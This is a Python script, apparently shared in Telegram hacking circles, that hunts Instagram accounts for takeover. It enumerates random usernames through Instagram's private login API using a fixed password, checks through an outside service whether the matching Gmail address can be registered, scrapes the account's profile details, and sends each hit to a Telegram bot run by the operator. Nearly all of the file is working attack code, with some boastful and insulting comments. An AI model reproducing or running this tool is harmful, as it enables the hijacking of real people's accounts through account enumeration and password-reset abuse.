import requests;from uuid import uuid4;from AegosPy import GetInfoInsta;uid= uuid4();from rich.console import Console;from rich.table import Table;import threading;from faker import Faker;fake = Faker()

#وحيد كنجم في سماء لايحتضنه احد.
#Alone as a star in the sky that no one embraces.
#هي ليست للجميع، ولكن لي.
#She is not for everyone, but for me
######L7N#####
O = '\x1b[38;5;208m' #برتقالي
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
K = '\033[2;35m'
B = '\033[2;36m'#سمائي
print(O+' ')
table = Table(title="Tools Check instagram Email",style="red")
table.add_column("The Tool By : 𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™",style='green')
table.add_row("My User : @g_4_q",style='green')
table.add_row("My Channel : @Topython",style='Cyan')
table.add_row("My Channel 2 : @ZZKGZ",style='yellow')
console = Console()
console.print(table)
L7n = Console()
tok = input('token')
iD = input('id')

print('             '*10)
# Check IG Random ! 
def L7Ngmail(email):
	L7N_hits=0	
	url =  'https://i.instagram.com/api/v1/accounts/login/'
	headers = { 'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US',
'X-IG-Capabilities': '3brTvw==',
'X-IG-Connection-Type': 'WIFI',
'Host': 'i.instagram.com',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'User-Agent':'Instagram 114.0.0.0.41 Android (30/3.0; 240dpi; 1242x2688; huawei/google; samsung; angler; angler; en_US)',
'Cookie': 'missing' }
	data = {'uuid':uid,  'password':'@L7NFurry',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
	req= requests.post(url, headers=headers, data=data).json()
	if req['message'] == 'The password you entered is incorrect. Please try again.':		
		url=requests.get(f"https://api-gm-55185f4bd1c1.herokuapp.com/api/gmail/v1/v.1/{email}").text
		if '"ar":"متاح"' in url:
		  		L7N_hits+=1		  		
		  		print(F+f'Available Gm : [ {email}@gmail.com ]')
		  		try:		  			
		  			Response = GetInfoInsta(email)
		  			Name = Response['name']
		  			Id = Response['id']
		  			Followers = Response['followers']
		  			Following = Response['following']
		  			Posts = Response['posts']
		  			Date = Response['date']		  			
		  			L7Nhunt = (f"""
Hello My Bro New Acc IG For You ⚡
––––––––𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™––––––––
Number Hunt : {L7N_hits}
Name : {Name}
Username : {email}
Email : {email}@gmail.com
ID : {Id}
Followers : {Followers}
Following : {Following}
Post : {Posts}
Data : {Date}
––––––––𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™––––––––
By : @g_4_q + @Topython """)		  			
		  			print(F+L7Nhunt)
		  			L7Ntele= (f"""
*Hello My Bro New Acc IG For You ⚡
––––––––𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™––––––––
Number Hunt : {L7N_hits}*
*Name :* {Name}
*Username :* @{email}
*Email :* {email}@gmail.com
*ID : {Id}
*Followers : {Followers}*
*Following : {Following}*
*Post : {Posts}*
*Data : {Date}*
––––––––𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™––––––––
By : @g_4_q + @Topython
		  					  			""")
		  			print(F+L7Nhunt)
		  			send_L7N = 'https://api.telegram.org/bot' + tok + '/sendMessage?chat_id=' + iD + '&parse_mode=Markdown&disable_web_page_preview = "true"&text=' + L7Ntele
		  			Rr = requests.get(send_L7N)	  		
		  		except:
		  			L7Nhunt = (f"""
Hello My Bro New Acc IG For You ⚡
––––––––𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™––––––––
Number Hunt : {L7N_hits}
Name : {Name}
Username : {email}
Email : {email}@gmail.com
ID : {Id}
Followers : {Followers}
Following : {Following}
Post : {Posts}
Data : {Date}
––––––––𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™––––––––
By : @g_4_q + @Topython """)
		  			L7Ntele= (f"""
*Hello My Bro New Acc IG For You ⚡
––––––––𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™––––––––
Number Hunt : {L7N_hits}*
*Name :* {Name}
*Username :* @{email}
*Email :* {email}@gmail.com
*ID : {Id}
*Followers : {Followers}*
*Following : {Following}*
*Post : {Posts}*
*Data : {Date}*
––––––––𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™––––––––
By : @g_4_q + @Topython
		  					  			""")
		  			send_L7N = 'https://api.telegram.org/bot' + tok + '/sendMessage?chat_id=' + iD + '&parse_mode=Markdown&disable_web_page_preview = "true"&text=' + L7Ntele
		  			Rr = requests.get(send_L7N)
		else:				
				print(X+f'Unvailable Gm : [ {email}@gmail.com ]')
	else:												
				print(R+f'Unvailable IG : [ {email}@gmail.com ]')

				
def L7Nlist():
 while True:
  try:
  	user = fake.email()
  	email=user.split('@')[0]
  	L7Ngmail(email)
  except:
  	L7Nexcept=313
# ان كنت خامطا فاخمط بصورة جيدة لان فضيحتك تأتي بسرعة ان لم تذكر حقوقي
# Hello Bitch L7N The Better ! 

Threads=[] 
for t in range(5):
 x = threading.Thread(target=L7Nlist)
 x.start()
 Threads.append(x)
for Th in Threads:
 Th.join()
L7Nlist()										
